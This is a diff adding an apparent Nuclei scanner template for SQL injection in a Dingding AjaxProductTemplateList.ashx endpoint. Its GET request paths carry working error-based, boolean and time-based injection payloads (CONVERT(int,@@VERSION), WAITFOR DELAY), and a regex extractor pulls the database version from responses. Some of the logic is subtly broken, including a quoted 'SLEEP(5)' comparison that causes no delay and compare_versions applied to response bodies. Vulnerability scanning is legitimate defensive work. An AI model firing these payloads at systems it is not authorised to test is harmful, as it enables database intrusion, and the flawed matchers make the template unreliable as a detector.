@@ -1,0 +1,76 @@
+id: ajaxproducttemplate-sql-injection
+
+info:
+  name: AjaxProductTemplateList SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template identifies a SQL Injection vulnerability in the AjaxProductTemplateList.ashx endpoint, allowing attackers to retrieve database sensitive information.
+  reference:
+    - https://example.com
+  tags: sql-injection,critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=SendMail&templateId=1'%20AND%201=@@VERSION--"
+      - "{{BaseURL}}/m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=SendMail&templateId=1'%20AND%201=CONVERT(int,@@VERSION)--"
+      - "{{BaseURL}}/m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=SendMail&templateId=1'%20AND%201=1--"
+      - "{{BaseURL}}/m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=SendMail&templateId=1'%20AND%201=2--"
+    
+    headers:
+      Host: "{{Hostname}}"
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+      Accept-Encoding: "gzip, deflate"
+      Accept-Language: "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
+      Connection: "keep-alive"
+      Upgrade-Insecure-Requests: "1"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      
+      - type: word
+        words:
+          - "Microsoft SQL Server"
+          - "SQL Server"
+          - "MySQL"
+          - "Oracle"
+          - "PostgreSQL"
+        condition: or
+        part: body
+      
+      # 区分真/假条件来减少误报
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'Microsoft SQL Server') || contains(body, 'MySQL') || contains(body, 'Oracle')"
+          - "compare_versions(tolower(string(body_before_1)), '!=', tolower(string(body_before_2)))"
+
+    extractors:
+      - type: regex
+        name: db_version
+        internal: false
+        group: 1
+        regex:
+          - "(?i)(Microsoft SQL Server[\\s\\S]*?\\d+\\.\\d+\\.\\d+)"
+          - "(?i)(MySQL[\\s\\S]*?\\d+\\.\\d+\\.\\d+)"
+          - "(?i)(Oracle[\\s\\S]*?\\d+\\.\\d+\\.\\d+)"
+
+  # 添加一个额外的请求来检测布尔盲注
+  - method: GET
+    path:
+      - "{{BaseURL}}/m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=SendMail&templateId=1'%20AND%20'SLEEP(5)'='SLEEP(5)"
+      - "{{BaseURL}}/m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=SendMail&templateId=1'%20WAITFOR%20DELAY%20'0:0:5'--"
+    
+    headers:
+      Host: "{{Hostname}}"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
